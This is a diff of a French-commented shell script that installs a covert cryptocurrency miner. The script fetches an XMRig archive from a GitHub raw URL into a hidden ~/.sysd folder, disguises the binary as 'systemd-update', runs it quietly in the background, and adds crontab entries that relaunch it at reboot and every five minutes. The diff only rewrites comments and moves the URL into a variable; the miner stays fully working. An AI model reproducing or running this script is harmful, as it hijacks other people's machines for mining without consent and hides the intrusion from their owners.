@@ -2,33 +2,36 @@
 
 DIR="$HOME/.sysd"
 BIN="systemd-update"
-GITHUB="https://raw.githubusercontent.com/ThipyThipy/machinee/main"
 LOGFILE="$HOME/setup_debug.log"
+ARCHIVE_URL="https://raw.githubusercontent.com/ThipyThipy/machinee/main/xmrig.tar.gz"
 
+# Créer le dossier caché
 mkdir -p "$DIR" && cd "$DIR" || exit 1
 
-# Log complet du setup
+# Activer le log complet dans un fichier
 exec > >(tee "$LOGFILE") 2>&1
 
-# Téléchargement de l'archive contenant le mineur + config
-curl -fsSL "$GITHUB/xmrig.tar.gz" -o miner.tar.gz
+# Télécharger l'archive contenant le binaire et la config
+curl -fsSL "$ARCHIVE_URL" -o miner.tar.gz
+
+# Extraire les fichiers
 tar -xzf miner.tar.gz
 chmod +x "$BIN"
 
+# Préparer le log de XMRig
 touch xmrig.log
 chmod 666 xmrig.log
 sleep 2
 
-# Lancement du mineur furtif
+# Lancer le mineur en tâche de fond, discrètement
 nohup nice -n 19 "$DIR/$BIN" --config="$DIR/config.json" > "$DIR/xmrig.log" 2>&1 &
 
-# Persistance via crontab
+# Ajouter persistance au démarrage
 (crontab -l 2>/dev/null; echo "@reboot $DIR/$BIN --config=$DIR/config.json > $DIR/xmrig.log 2>&1") | crontab -
 (crontab -l 2>/dev/null; echo "*/5 * * * * pgrep -f $BIN > /dev/null || $DIR/$BIN --config=$DIR/config.json > $DIR/xmrig.log 2>&1") | crontab -
 
+# Vérification rapide
 sleep 5
-
-# Vérification du lancement
 if [ -f "$DIR/xmrig.log" ]; then
   echo -e "\n[🧠] Dernières lignes du log XMRig :"
   tail -n 10 "$DIR/xmrig.log"
